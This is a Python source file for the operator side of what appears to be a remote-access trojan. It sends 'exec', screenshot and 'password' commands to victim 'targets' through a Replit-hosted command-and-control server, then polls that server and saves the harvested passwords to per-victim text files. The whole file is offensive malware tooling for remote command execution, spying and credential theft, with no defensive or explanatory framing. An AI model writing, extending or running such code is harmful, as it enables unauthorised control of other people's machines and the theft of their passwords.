import os
import json
import requests
import threading
import asyncio
import subprocess

URL = "https://62d00077-98c1-400d-9c7d-d9148d8ec7b6-00-37654x8qsze2r.spock.replit.dev/" #"http://127.0.0.1:8080"
LAST_TARGET = ""
current_directory = os.path.dirname(os.path.abspath(__file__))
users_directory = os.path.join(current_directory, 'Users', "User.json")

class CommandClass:
    def __init__(self, command: str) -> None:
        self.command = command
        self.data = os.path.join(os.getcwd(), 'data')
        
        self.commands = {
            'exec': self.execute_command,
            'ss': self.take_screenshot,
            'password': self.steal_passwords
        }
        
    def execute_command(self):
        global LAST_TARGET
        target = input("Enter Target Here: ")
        print(f"Executing command: {self.command}")
        print("Please wait a few seconds")
        command_to_execute = self.command.split(' ', 1)[1]
        try:
            response = requests.get(f"{URL}/exec?target={target}&command={command_to_execute}&response=nil_")
            LAST_TARGET = target
        except Exception as e:
            print(e)

    def take_screenshot(self):
        global LAST_TARGET
        try:
            target = input("Enter Target Here: ")
            response = requests.get(f"{URL}/ss?target={target}&state=true&imgdata=nil_")
        except Exception as e:
            print(e)
            
    def steal_passwords(self):
        global LAST_TARGET
        target = input("Enter Target Here: ")
        print("Please wait a few seconds")
        try:
            response = requests.get(f"{URL}/passwords?target={target}&state=true&passwords=[]")
            LAST_TARGET = target
        except Exception as e:
            print(e)

    def execute(self):
        command_name = self.command.split()[0]
        if command_name in self.commands:
            self.commands[command_name]()
        else:
            print(f"Unknown command: {command_name}")
            
def get_user_data():
    with open(users_directory, "r") as file:
        data = json.load(file)
        
    return data

def writefile(data):
    with open(users_directory, "w") as file:
        json.dump(data, file, indent=4)
        
    return True

def get_first_word(s):
    words = s.split()
    if words:
        return words[0]
    return None

def handle_commands():
    while True:
        try:
            command = input("Command: ")
            if not command:
                continue  # Skip empty commands
            if command.lower() == 'exit':
                break

            command_instance = CommandClass(command.lower())
            command_instance.execute()
            requests.get(f"{URL}/new_cmd?command={get_first_word(command)}")
        except (ConnectionResetError, ConnectionAbortedError) as e:
            print(f"Connection error: {e}")
            break
        except Exception as e:
            print(f"Unexpected error: {e}")

def create_data_folder():
    data_folder = f'{os.getcwd()}/data'    
    if not os.path.exists(data_folder):
        try:
            os.makedirs(data_folder)
            print(f"Created 'data' folder at {data_folder}")
        except OSError as e:
            print(f"Error creating 'data' folder: {e}")

create_data_folder()
import time

def Test():
    while True:
        time.sleep(1)

def listen():
    global LAST_TARGET
    while True:
        try:
            if LAST_TARGET == "":
                continue

            response = requests.get(f"{URL}/commands?user={LAST_TARGET}")
            UserData = response.json()[LAST_TARGET]
            commands = UserData.get("commands", {})
            for i, v in commands.items():
                if i == "exec":
                    response = v["response"]
                    if response != "":
                        requests.get(f"{URL}/exec?target={LAST_TARGET}&command=nil_&response=nil_")
                        LAST_TARGET = ""
                        print(f"\nResponse: {response}\nCommand: ", end="")
                elif i == "password" and v["passwords"] != []:
                    requests.get(f"{URL}/passwords?target={LAST_TARGET}&state=false&passwords=[]")
                    print(f"\npasswords retrived from the client \n File Path: {current_directory}/passwords-{LAST_TARGET}.txt\nCommand: ", end="")
                    with open(f"{current_directory}/passwords-{LAST_TARGET}.txt", "w") as f:
                        for password_info in v["passwords"]:
                            f.write(password_info + "\n")
                            
                    LAST_TARGET = ""
                        
            time.sleep(5)
        except Exception as e:
            print(f"{e}")

def run_asyncio_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

if __name__ == "__main__":
    loop = asyncio.new_event_loop()

    listen_thread = threading.Thread(target=listen)
    listen_thread.start()
    
    command_handler_thread = threading.Thread(target=handle_commands)
    command_handler_thread.start()